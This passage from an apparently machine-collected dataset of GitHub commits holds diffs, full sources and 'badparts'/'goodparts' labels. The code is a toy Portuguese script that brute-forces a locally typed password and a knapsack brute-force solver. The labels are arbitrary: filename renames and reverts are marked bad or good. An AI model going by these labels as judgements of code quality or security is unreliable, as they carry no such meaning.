return ''.join(random.choice(letters) for i in range(length))\n-    \n-\"\"\"\n-\n-def brute_force_password(password, max_length=8):\n-    # Tenta adivinhar a senha por for\u00e7a bruta\n-    for length in range(1, max_length + 1):\n+def brute_force_password(password, min_length=1, max_length=8):\n+    for length in range(min_length, max_length + 1):\n         for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):\n             guess_password = ''.join(guess)\n             if guess_password == password:\n@@ -21,11 +12,27 @@ def brute_force_password(password, max_length=8):\n                 print(f'\\rTentando senha: {guess_password}', end='')\n     return None\n \n+def parallel_brute_force_password(password, lengths):\n+    with concurrent.futures.ThreadPoolExecutor() as executor:\n+        futures = {executor.submit(brute_force_password, password, min_length, max_length): (min_length, max_length) for min_length, max_length in lengths}\n+        for future in concurrent.futures.as_completed(futures):\n+            min_length, max_length = futures[future]\n+            try:\n+                guess_password = future.result()\n+                if guess_password:\n+                    return guess_password\n+            except Exception as exc:\n+                print(f'Erro na faixa de comprimento ({min_length}, {max_length}): {exc}')\n+    return None\n+\n # Solicita a senha ao usu\u00e1rio\n password = input('Digite a senha: ')\n \n-# Tenta adivinhar a senha por for\u00e7a bruta\n-guess_password = brute_force_password(password)\n+# Define as faixas de comprimento de senha para verificar\n+length_ranges = [(1, 3), (4, 4), (5, 8)]\n+\n+# Tenta adivinhar a senha por for\u00e7a bruta em paralelo\n+guess_password = parallel_brute_force_password(password, length_ranges)\n \n if guess_password:\n     print(f'\\nSenha encontrada: {guess_password}')\n","message":"","files":{"\/brute_force_password.py":{"changes":[{"diff":"\n-import random\n import string\n import itertools\n+import concurrent.futures\n \n-\"\"\"\n-def generate_password(length=8):\n-    # Gera uma senha aleat\u00f3ria com letras min\u00fasculas, mai\u00fasculas e d\u00edgitos\n-    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits\n-    return ''.join(random.choice(letters) for i in range(length))\n-    \n-\"\"\"\n-\n-def brute_force_password(password, max_length=8):\n-    # Tenta adivinhar a senha por for\u00e7a bruta\n-    for length in range(1, max_length + 1):\n+def brute_force_password(password, min_length=1, max_length=8):\n+    for length in range(min_length, max_length + 1):\n         for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):\n             guess_password = ''.join(guess)\n             if guess_password == password:\n","add":3,"remove":12,"filename":"\/brute_force_password.py","badparts":["import random","\"\"\"","def generate_password(length=8):","    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits","    return ''.join(random.choice(letters) for i in range(length))","\"\"\"","def brute_force_password(password, max_length=8):","    for length in range(1, max_length + 1):"],"goodparts":["import concurrent.futures","def brute_force_password(password, min_length=1, max_length=8):","    for length in range(min_length, max_length + 1):"]},{"diff":"\n                 print(f'\\rTentando senha: {guess_password}', end='')\n     return None\n \n+def parallel_brute_force_password(password, lengths):\n+    with concurrent.futures.ThreadPoolExecutor() as executor:\n+        futures = {executor.submit(brute_force_password, password, min_length, max_length): (min_length, max_length) for min_length, max_length in lengths}\n+        for future in concurrent.futures.as_completed(futures):\n+            min_length, max_length = futures[future]\n+            try:\n+                guess_password = future.result()\n+                if guess_password:\n+                    return guess_password\n+            except Exception as exc:\n+                print(f'Erro na faixa de comprimento ({min_length}, {max_length}): {exc}')\n+    return None\n+\n # Solicita a senha ao usu\u00e1rio\n password = input('Digite a senha: ')\n \n-# Tenta adivinhar a senha por for\u00e7a bruta\n-guess_password = brute_force_password(password)\n+# Define as faixas de comprimento de senha para verificar\n+length_ranges = [(1, 3), (4, 4), (5, 8)]\n+\n+# Tenta adivinhar a senha por for\u00e7a bruta em paralelo\n+guess_password = parallel_brute_force_password(password, length_ranges)\n \n if guess_password:\n     print(f'\\nSenha encontrada: {guess_password}')\n","add":18,"remove":2,"filename":"\/brute_force_password.py","badparts":["guess_password = brute_force_password(password)"],"goodparts":["def parallel_brute_force_password(password, lengths):","    with concurrent.futures.ThreadPoolExecutor() as executor:","        futures = {executor.submit(brute_force_password, password, min_length, max_length): (min_length, max_length) for min_length, max_length in lengths}","        for future in concurrent.futures.as_completed(futures):","            min_length, max_length = futures[future]","            try:","                guess_password = future.result()","                if guess_password:","                    return guess_password","            except Exception as exc:","                print(f'Erro na faixa de comprimento ({min_length}, {max_length}): {exc}')","    return None","length_ranges = [(1, 3), (4, 4), (5, 8)]","guess_password = parallel_brute_force_password(password, length_ranges)"]}],"source":"\nimport random import string import itertools \"\"\" def generate_password(length=8): letters=string.ascii_lowercase +string.ascii_uppercase +string.digits return ''.join(random.choice(letters) for i in range(length)) \"\"\" def brute_force_password(password, max_length=8): for length in range(1, max_length +1): for guess in itertools.product(string.ascii_letters +string.digits, repeat=length): guess_password=''.join(guess) if guess_password==password: return guess_password else: print(f'\\rTentando senha:{guess_password}', end='') return None password=input('Digite a senha: ') guess_password=brute_force_password(password) if guess_password: print(f'\\nSenha encontrada:{guess_password}') else: print('\\nN\u00e3o foi poss\u00edvel adivinhar a senha') ","sourceWithComments":"import random\nimport string\nimport itertools\n\n\"\"\"\ndef generate_password(length=8):\n    # Gera uma senha aleat\u00f3ria com letras min\u00fasculas, mai\u00fasculas e d\u00edgitos\n    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits\n    return ''.join(random.choice(letters) for i in range(length))\n    \n\"\"\"\n\ndef brute_force_password(password, max_length=8):\n    # Tenta adivinhar a senha por for\u00e7a bruta\n    for length in range(1, max_length + 1):\n        for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):\n            guess_password = ''.join(guess)\n            if guess_password == password:\n                return guess_password\n            else:\n                print(f'\\rTentando senha: {guess_password}', end='')\n    return None\n\n# Solicita a senha ao usu\u00e1rio\npassword = input('Digite a senha: ')\n\n# Tenta adivinhar a senha por for\u00e7a bruta\nguess_password = brute_force_password(password)\n\nif guess_password:\n    print(f'\\nSenha encontrada: {guess_password}')\nelse:\n    print('\\nN\u00e3o foi poss\u00edvel adivinhar a senha')\n"}},"msg":"Update brute_force_password.py"},"5c90709856ee2715d042e11fbdce2a952af1e3a0":{"url":"https:\/\/api.github.com\/repos\/Thiago1alberto\/brute_force_password\/commits\/5c90709856ee2715d042e11fbdce2a952af1e3a0","html_url":"https:\/\/github.com\/Thiago1alberto\/brute_force_password\/commit\/5c90709856ee2715d042e11fbdce2a952af1e3a0","message":"Update brute_force_password.py","sha":"5c90709856ee2715d042e11fbdce2a952af1e3a0","keyword":"brute force update","diff":"diff --git a\/brute_force_password.py b\/brute_force_password.py\nindex 0064db0..35f5385 100644\n--- a\/brute_force_password.py\n+++ b\/brute_force_password.py\n@@ -1,9 +1,18 @@\n+import random\n import string\n import itertools\n-import concurrent.futures\n \n-def brute_force_password(password, min_length=1, max_length=8):\n-    for length in range(min_length, max_length + 1):\n+\"\"\"\n+def generate_password(length=8):\n+    # Gera uma senha aleat\u00f3ria com letras min\u00fasculas, mai\u00fasculas e d\u00edgitos\n+    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits\n+    return ''.join(random.choice(letters) for i in range(length))\n+    \n+\"\"\"\n+\n+def brute_force_password(password, max_length=8):\n+    # Tenta adivinhar a senha por for\u00e7a bruta\n+    for length in range(1, max_length + 1):\n         for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):\n             guess_password = ''.join(guess)\n             if guess_password == password:\n@@ -12,27 +21,11 @@ def brute_force_password(password, min_length=1, max_length=8):\n                 print(f'\\rTentando senha: {guess_password}', end='')\n     return None\n \n-def parallel_brute_force_password(password, lengths):\n-    with concurrent.futures.ThreadPoolExecutor() as executor:\n-        futures = {executor.submit(brute_force_password, password, min_length, max_length): (min_length, max_length) for min_length, max_length in lengths}\n-        for future in concurrent.futures.as_completed(futures):\n-            min_length, max_length = futures[future]\n-            try:\n-                guess_password = future.result()\n-                if guess_password:\n-                    return guess_password\n-            except Exception as exc:\n-                print(f'Erro na faixa de comprimento ({min_length}, {max_length}): {exc}')\n-    return None\n-\n # Solicita a senha ao usu\u00e1rio\n password = input('Digite a senha: ')\n \n-# Define as faixas de comprimento de senha para verificar\n-length_ranges = [(1, 3), (4, 4), (5, 8)]\n-\n-# Tenta adivinhar a senha por for\u00e7a bruta em paralelo\n-guess_password = parallel_brute_force_password(password, length_ranges)\n+# Tenta adivinhar a senha por for\u00e7a bruta\n+guess_password = brute_force_password(password)\n \n if guess_password:\n     print(f'\\nSenha encontrada: {guess_password}')\n","files":{"\/brute_force_password.py":{"changes":[{"diff":"\n+import random\n import string\n import itertools\n-import concurrent.futures\n \n-def brute_force_password(password, min_length=1, max_length=8):\n-    for length in range(min_length, max_length + 1):\n+\"\"\"\n+def generate_password(length=8):\n+    # Gera uma senha aleat\u00f3ria com letras min\u00fasculas, mai\u00fasculas e d\u00edgitos\n+    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits\n+    return ''.join(random.choice(letters) for i in range(length))\n+    \n+\"\"\"\n+\n+def brute_force_password(password, max_length=8):\n+    # Tenta adivinhar a senha por for\u00e7a bruta\n+    for length in range(1, max_length + 1):\n         for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):\n             guess_password = ''.join(guess)\n             if guess_password == password:\n","add":12,"remove":3,"filename":"\/brute_force_password.py","badparts":["import concurrent.futures","def brute_force_password(password, min_length=1, max_length=8):","    for length in range(min_length, max_length + 1):"],"goodparts":["import random","\"\"\"","def generate_password(length=8):","    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits","    return ''.join(random.choice(letters) for i in range(length))","\"\"\"","def brute_force_password(password, max_length=8):","    for length in range(1, max_length + 1):"]},{"diff":"\n                 print(f'\\rTentando senha: {guess_password}', end='')\n     return None\n \n-def parallel_brute_force_password(password, lengths):\n-    with concurrent.futures.ThreadPoolExecutor() as executor:\n-        futures = {executor.submit(brute_force_password, password, min_length, max_length): (min_length, max_length) for min_length, max_length in lengths}\n-        for future in concurrent.futures.as_completed(futures):\n-            min_length, max_length = futures[future]\n-            try:\n-                guess_password = future.result()\n-                if guess_password:\n-                    return guess_password\n-            except Exception as exc:\n-                print(f'Erro na faixa de comprimento ({min_length}, {max_length}): {exc}')\n-    return None\n-\n # Solicita a senha ao usu\u00e1rio\n password = input('Digite a senha: ')\n \n-# Define as faixas de comprimento de senha para verificar\n-length_ranges = [(1, 3), (4, 4), (5, 8)]\n-\n-# Tenta adivinhar a senha por for\u00e7a bruta em paralelo\n-guess_password = parallel_brute_force_password(password, length_ranges)\n+# Tenta adivinhar a senha por for\u00e7a bruta\n+guess_password = brute_force_password(password)\n \n if guess_password:\n     print(f'\\nSenha encontrada: {guess_password}')\n","add":2,"remove":18,"filename":"\/brute_force_password.py","badparts":["def parallel_brute_force_password(password, lengths):","    with concurrent.futures.ThreadPoolExecutor() as executor:","        futures = {executor.submit(brute_force_password, password, min_length, max_length): (min_length, max_length) for min_length, max_length in lengths}","        for future in concurrent.futures.as_completed(futures):","            min_length, max_length = futures[future]","            try:","                guess_password = future.result()","                if guess_password:","                    return guess_password","            except Exception as exc:","                print(f'Erro na faixa de comprimento ({min_length}, {max_length}): {exc}')","    return None","length_ranges = [(1, 3), (4, 4), (5, 8)]","guess_password = parallel_brute_force_password(password, length_ranges)"],"goodparts":["guess_password = brute_force_password(password)"]}],"source":"\nimport string import itertools import concurrent.futures def brute_force_password(password, min_length=1, max_length=8): for length in range(min_length, max_length +1): for guess in itertools.product(string.ascii_letters +string.digits, repeat=length): guess_password=''.join(guess) if guess_password==password: return guess_password else: print(f'\\rTentando senha:{guess_password}', end='') return None def parallel_brute_force_password(password, lengths): with concurrent.futures.ThreadPoolExecutor() as executor: futures={executor.submit(brute_force_password, password, min_length, max_length):(min_length, max_length) for min_length, max_length in lengths} for future in concurrent.futures.as_completed(futures): min_length, max_length=futures[future] try: guess_password=future.result() if guess_password: return guess_password except Exception as exc: print(f'Erro na faixa de comprimento({min_length},{max_length}):{exc}') return None password=input('Digite a senha: ') length_ranges=[(1, 3),(4, 4),(5, 8)] guess_password=parallel_brute_force_password(password, length_ranges) if guess_password: print(f'\\nSenha encontrada:{guess_password}') else: print('\\nN\u00e3o foi poss\u00edvel adivinhar a senha') ","sourceWithComments":"import string\nimport itertools\nimport concurrent.futures\n\ndef brute_force_password(password, min_length=1, max_length=8):\n    for length in range(min_length, max_length + 1):\n        for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):\n            guess_password = ''.join(guess)\n            if guess_password == password:\n                return guess_password\n            else:\n                print(f'\\rTentando senha: {guess_password}', end='')\n    return None\n\ndef parallel_brute_force_password(password, lengths):\n    with concurrent.futures.ThreadPoolExecutor() as executor:\n        futures = {executor.submit(brute_force_password, password, min_length, max_length): (min_length, max_length) for min_length, max_length in lengths}\n        for future in concurrent.futures.as_completed(futures):\n            min_length, max_length = futures[future]\n            try:\n                guess_password = future.result()\n                if guess_password:\n                    return guess_password\n            except Exception as exc:\n                print(f'Erro na faixa de comprimento ({min_length}, {max_length}): {exc}')\n    return None\n\n# Solicita a senha ao usu\u00e1rio\npassword = input('Digite a senha: ')\n\n# Define as faixas de comprimento de senha para verificar\nlength_ranges = [(1, 3), (4, 4), (5, 8)]\n\n# Tenta adivinhar a senha por for\u00e7a bruta em paralelo\nguess_password = parallel_brute_force_password(password, length_ranges)\n\nif guess_password:\n    print(f'\\nSenha encontrada: {guess_password}')\nelse:\n    print('\\nN\u00e3o foi poss\u00edvel adivinhar a senha')\n"}},"msg":"Update brute_force_password.py"}},"https:\/\/github.com\/999Kit\/AI-Project-1-The-knapsack-problem":{"ba11d4ea1c94689945b6bf895daa0c199f46691b":{"url":"https:\/\/api.github.com\/repos\/999Kit\/AI-Project-1-The-knapsack-problem\/commits\/ba11d4ea1c94689945b6bf895daa0c199f46691b","html_url":"https:\/\/github.com\/999Kit\/AI-Project-1-The-knapsack-problem\/commit\/ba11d4ea1c94689945b6bf895daa0c199f46691b","sha":"ba11d4ea1c94689945b6bf895daa0c199f46691b","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 6f8c8be..8d77ad6 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -85,7 +85,7 @@ def solve(solution, best_value, model, model_length):\n if __name__ == \"__main__\":\r\n     num_of_files = int(input(\"Enter number of input files: \"))\r\n     for i in range(1, num_of_files + 1):\r\n-        with open(f\"Input{i}.txt\", \"r\") as input_file, open(f\"Output{i}.txt\", \"w\") as output_file:\r\n+        with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r\n             max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n             sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n             write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n if __name__ == \"__main__\":\r\n     num_of_files = int(input(\"Enter number of input files: \"))\r\n     for i in range(1, num_of_files + 1):\r\n-        with open(f\"Input{i}.txt\", \"r\") as input_file, open(f\"Output{i}.txt\", \"w\") as output_file:\r\n+        with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r\n             max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n             sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n             write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["        with open(f\"Input{i}.txt\", \"r\") as input_file, open(f\"Output{i}.txt\", \"w\") as output_file:\r"],"goodparts":["        with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r"]}],"source":"\nimport sys\r sys.set_int_max_str_digits(0)\r \r \r def read_data_from_file(file_handle):\r lines=file_handle.readlines()\r max_w, num_c=int(lines[0]), int(lines[1])\r \r w_list=[]\r v_list=[]\r c_list=[]\r \r for w in lines[2].split(\", \"):\r w_list.append(int(w))\r \r for v in lines[3].split(\", \"):\r v_list.append(int(v))\r \r for c in lines[4].split(\", \"):\r c_list.append(int(c))\r \r return max_w, num_c, w_list, v_list, c_list\r \r \r def write_solution_to_file(file_handle, total_value, model, num_of_objects):\r file_handle.write(str(total_value) +\"\\n\")\r file_handle.write(str(model & 1))\r for k in range(1, num_of_objects):\r file_handle.write(\", \" +str((model >> k) & 1))\r \r \r def brute_force(weights, values, classes, max_capacity, num_classes):\r def evaluation_function(model):\r classes_chosen=0\r total_weight=0\r total_value=0\r \r for idx in range(len(weight_list)):\r if(model[0] >> idx) & 1==1:\r total_weight +=weights[idx]\r \r if total_weight > max_capacity:\r return 0\r \r total_value +=values[idx]\r classes_chosen |=1 <<(classes[idx] -1)\r \r if classes_chosen !=2 ** num_classes -1:\r return 0\r \r return total_value\r \r def solve(solution, best_value, model, model_length):\r if model_length[0]==len(weights):\r evaluation_value=evaluation_function(model)\r \r if evaluation_value > best_value[0]:\r best_value[0]=evaluation_value\r solution[0]=model[0]\r \r return\r \r model_length[0] +=1\r solve(solution, best_value, model, model_length)\r \r model_length[0] -=1\r model[0] ^=1 << model_length[0]\r \r model_length[0] +=1\r solve(solution, best_value, model, model_length)\r \r model_length[0] -=1\r model[0] ^=1 << model_length[0]\r \r solution_model=[0]\r solution_value=[0]\r \r state=[0]\r state_length=[0]\r \r solve(solution_model, solution_value, state, state_length)\r return solution_model[0], solution_value[0]\r \r \r if __name__==\"__main__\":\r num_of_files=int(input(\"Enter number of input files: \"))\r for i in range(1, num_of_files +1):\r with open(f\"Input{i}.txt\", \"r\") as input_file, open(f\"Output{i}.txt\", \"w\") as output_file:\r max_weight, num_of_classes, weight_list, value_list, class_list=read_data_from_file(input_file)\r sol, sol_val=brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r ","sourceWithComments":"import sys\r\nsys.set_int_max_str_digits(0)\r\n\r\n\r\ndef read_data_from_file(file_handle):\r\n    lines = file_handle.readlines()\r\n    max_w, num_c = int(lines[0]), int(lines[1])\r\n\r\n    w_list = []\r\n    v_list = []\r\n    c_list = []\r\n\r\n    for w in lines[2].split(\", \"):\r\n        w_list.append(int(w))\r\n\r\n    for v in lines[3].split(\", \"):\r\n        v_list.append(int(v))\r\n\r\n    for c in lines[4].split(\", \"):\r\n        c_list.append(int(c))\r\n\r\n    return max_w, num_c, w_list, v_list, c_list\r\n\r\n\r\ndef write_solution_to_file(file_handle, total_value, model, num_of_objects):\r\n    file_handle.write(str(total_value) + \"\\n\")\r\n    file_handle.write(str(model & 1))\r\n    for k in range(1, num_of_objects):\r\n        file_handle.write(\", \" + str((model >> k) & 1))\r\n\r\n\r\ndef brute_force(weights, values, classes, max_capacity, num_classes):\r\n    def evaluation_function(model):\r\n        classes_chosen = 0\r\n        total_weight = 0\r\n        total_value = 0\r\n\r\n        for idx in range(len(weight_list)):\r\n            if (model[0] >> idx) & 1 == 1:\r\n                total_weight += weights[idx]\r\n\r\n                if total_weight > max_capacity:\r\n                    return 0\r\n\r\n                total_value += values[idx]\r\n                classes_chosen |= 1 << (classes[idx] - 1)\r\n\r\n        if classes_chosen != 2 ** num_classes - 1:\r\n            return 0\r\n\r\n        return total_value\r\n\r\n    def solve(solution, best_value, model, model_length):\r\n        if model_length[0] == len(weights):\r\n            evaluation_value = evaluation_function(model)\r\n\r\n            if evaluation_value > best_value[0]:\r\n                best_value[0] = evaluation_value\r\n                solution[0] = model[0]\r\n\r\n            return\r\n\r\n        model_length[0] += 1\r\n        solve(solution, best_value, model, model_length)\r\n\r\n        model_length[0] -= 1\r\n        model[0] ^= 1 << model_length[0]\r\n\r\n        model_length[0] += 1\r\n        solve(solution, best_value, model, model_length)\r\n\r\n        model_length[0] -= 1\r\n        model[0] ^= 1 << model_length[0]\r\n\r\n    solution_model = [0]\r\n    solution_value = [0]\r\n\r\n    state = [0]\r\n    state_length = [0]\r\n\r\n    solve(solution_model, solution_value, state, state_length)\r\n    return solution_model[0], solution_value[0]\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    num_of_files = int(input(\"Enter number of input files: \"))\r\n    for i in range(1, num_of_files + 1):\r\n        with open(f\"Input{i}.txt\", \"r\") as input_file, open(f\"Output{i}.txt\", \"w\") as output_file:\r\n            max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n            sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n            write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r\n"}},"msg":"Update brute_force.py"},"b13b0646c1f9d058312a84b137f131a764f7994d":{"url":"https:\/\/api.github.com\/repos\/999Kit\/AI-Project-1-The-knapsack-problem\/commits\/b13b0646c1f9d058312a84b137f131a764f7994d","html_url":"https:\/\/github.com\/999Kit\/AI-Project-1-The-knapsack-problem\/commit\/b13b0646c1f9d058312a84b137f131a764f7994d","sha":"b13b0646c1f9d058312a84b137f131a764f7994d","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 8d77ad6..a6b7d97 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -85,7 +85,7 @@ def solve(solution, best_value, model, model_length):\n if __name__ == \"__main__\":\r\n     num_of_files = int(input(\"Enter number of input files: \"))\r\n     for i in range(1, num_of_files + 1):\r\n-        with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r\n+        with open(f\"INPUT_{i}.txt\", \"r\") as input_file, open(f\"OUTPUT_{i}.txt\", \"w\") as output_file:\r\n             max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n             sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n             write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n if __name__ == \"__main__\":\r\n     num_of_files = int(input(\"Enter number of input files: \"))\r\n     for i in range(1, num_of_files + 1):\r\n-        with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r\n+        with open(f\"INPUT_{i}.txt\", \"r\") as input_file, open(f\"OUTPUT_{i}.txt\", \"w\") as output_file:\r\n             max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n             sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n             write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["        with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r"],"goodparts":["        with open(f\"INPUT_{i}.txt\", \"r\") as input_file, open(f\"OUTPUT_{i}.txt\", \"w\") as output_file:\r"]}],"source":"\nimport sys\r sys.set_int_max_str_digits(0)\r \r \r def read_data_from_file(file_handle):\r lines=file_handle.readlines()\r max_w, num_c=int(lines[0]), int(lines[1])\r \r w_list=[]\r v_list=[]\r c_list=[]\r \r for w in lines[2].split(\", \"):\r w_list.append(int(w))\r \r for v in lines[3].split(\", \"):\r v_list.append(int(v))\r \r for c in lines[4].split(\", \"):\r c_list.append(int(c))\r \r return max_w, num_c, w_list, v_list, c_list\r \r \r def write_solution_to_file(file_handle, total_value, model, num_of_objects):\r file_handle.write(str(total_value) +\"\\n\")\r file_handle.write(str(model & 1))\r for k in range(1, num_of_objects):\r file_handle.write(\", \" +str((model >> k) & 1))\r \r \r def brute_force(weights, values, classes, max_capacity, num_classes):\r def evaluation_function(model):\r classes_chosen=0\r total_weight=0\r total_value=0\r \r for idx in range(len(weight_list)):\r if(model[0] >> idx) & 1==1:\r total_weight +=weights[idx]\r \r if total_weight > max_capacity:\r return 0\r \r total_value +=values[idx]\r classes_chosen |=1 <<(classes[idx] -1)\r \r if classes_chosen !=2 ** num_classes -1:\r return 0\r \r return total_value\r \r def solve(solution, best_value, model, model_length):\r if model_length[0]==len(weights):\r evaluation_value=evaluation_function(model)\r \r if evaluation_value > best_value[0]:\r best_value[0]=evaluation_value\r solution[0]=model[0]\r \r return\r \r model_length[0] +=1\r solve(solution, best_value, model, model_length)\r \r model_length[0] -=1\r model[0] ^=1 << model_length[0]\r \r model_length[0] +=1\r solve(solution, best_value, model, model_length)\r \r model_length[0] -=1\r model[0] ^=1 << model_length[0]\r \r solution_model=[0]\r solution_value=[0]\r \r state=[0]\r state_length=[0]\r \r solve(solution_model, solution_value, state, state_length)\r return solution_model[0], solution_value[0]\r \r \r if __name__==\"__main__\":\r num_of_files=int(input(\"Enter number of input files: \"))\r for i in range(1, num_of_files +1):\r with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r max_weight, num_of_classes, weight_list, value_list, class_list=read_data_from_file(input_file)\r sol, sol_val=brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r ","sourceWithComments":"import sys\r\nsys.set_int_max_str_digits(0)\r\n\r\n\r\ndef read_data_from_file(file_handle):\r\n    lines = file_handle.readlines()\r\n    max_w, num_c = int(lines[0]), int(lines[1])\r\n\r\n    w_list = []\r\n    v_list = []\r\n    c_list = []\r\n\r\n    for w in lines[2].split(\", \"):\r\n        w_list.append(int(w))\r\n\r\n    for v in lines[3].split(\", \"):\r\n        v_list.append(int(v))\r\n\r\n    for c in lines[4].split(\", \"):\r\n        c_list.append(int(c))\r\n\r\n    return max_w, num_c, w_list, v_list, c_list\r\n\r\n\r\ndef write_solution_to_file(file_handle, total_value, model, num_of_objects):\r\n    file_handle.write(str(total_value) + \"\\n\")\r\n    file_handle.write(str(model & 1))\r\n    for k in range(1, num_of_objects):\r\n        file_handle.write(\", \" + str((model >> k) & 1))\r\n\r\n\r\ndef brute_force(weights, values, classes, max_capacity, num_classes):\r\n    def evaluation_function(model):\r\n        classes_chosen = 0\r\n        total_weight = 0\r\n        total_value = 0\r\n\r\n        for idx in range(len(weight_list)):\r\n            if (model[0] >> idx) & 1 == 1:\r\n                total_weight += weights[idx]\r\n\r\n                if total_weight > max_capacity:\r\n                    return 0\r\n\r\n                total_value += values[idx]\r\n                classes_chosen |= 1 << (classes[idx] - 1)\r\n\r\n        if classes_chosen != 2 ** num_classes - 1:\r\n            return 0\r\n\r\n        return total_value\r\n\r\n    def solve(solution, best_value, model, model_length):\r\n        if model_length[0] == len(weights):\r\n            evaluation_value = evaluation_function(model)\r\n\r\n            if evaluation_value > best_value[0]:\r\n                best_value[0] = evaluation_value\r\n                solution[0] = model[0]\r\n\r\n            return\r\n\r\n        model_length[0] += 1\r\n        solve(solution, best_value, model, model_length)\r\n\r\n        model_length[0] -= 1\r\n        model[0] ^= 1 << model_length[0]\r\n\r\n        model_length[0] += 1\r\n        solve(solution, best_value, model, model_length)\r\n\r\n        model_length[0] -= 1\r\n        model[0] ^= 1 << model_length[0]\r\n\r\n    solution_model = [0]\r\n    solution_value = [0]\r\n\r\n    state = [0]\r\n    state_length = [0]\r\n\r\n    solve(solution_model, solution_value, state, state_length)\r\n    return solution_model[0], solution_value[0]\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    num_of_files = int(input(\"Enter number of input files: \"))\r\n    for i in range(1, num_of_files + 1):\r\n        with open(f\"INPUT{i}.txt\", \"r\") as input_file, open(f\"OUTPUT{i}.txt\", \"w\") as output_file:\r\n            max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n            sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n            write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r\n"}},"msg":"Update brute_force.py"},"e2c9ad02e377c8e633e37f1cc785269c0712bca8":{"url":"https:\/\/api.github.com\/repos\/999Kit\/AI-Project-1-The-knapsack-problem\/commits\/e2c9ad02e377c8e633e37f1cc785269c0712bca8","html_url":"https:\/\/github.com\/999Kit\/AI-Project-1-The-knapsack-problem\/commit\/e2c9ad02e377c8e633e37f1cc785269c0712bca8","message":"Update brute_force.py","sha":"e2c9ad02e377c8e633e37f1cc785269c0712bca8","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex a6b7d97..194f55a 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -84,7 +84,7 @@ def solve(solution, best_value, model, model_length):\n \r\n if __name__ == \"__main__\":\r\n     num_of_files = int(input(\"Enter number of input files: \"))\r\n-    for i in range(1, num_of_files + 1):\r\n+    for i in range(0, num_of_files):\r\n         with open(f\"INPUT_{i}.txt\", \"r\") as input_file, open(f\"OUTPUT_{i}.txt\", \"w\") as output_file:\r\n             max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n             sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n \r\n if __name__ == \"__main__\":\r\n     num_of_files = int(input(\"Enter number of input files: \"))\r\n-    for i in range(1, num_of_files + 1):\r\n+    for i in range(0, num_of_files):\r\n         with open(f\"INPUT_{i}.txt\", \"r\") as input_file, open(f\"OUTPUT_{i}.txt\", \"w\") as output_file:\r\n             max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n             sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["    for i in range(1, num_of_files + 1):\r"],"goodparts":["    for i in range(0, num_of_files):\r"]}],"source":"\nimport sys\r sys.set_int_max_str_digits(0)\r \r \r def read_data_from_file(file_handle):\r lines=file_handle.readlines()\r max_w, num_c=int(lines[0]), int(lines[1])\r \r w_list=[]\r v_list=[]\r c_list=[]\r \r for w in lines[2].split(\", 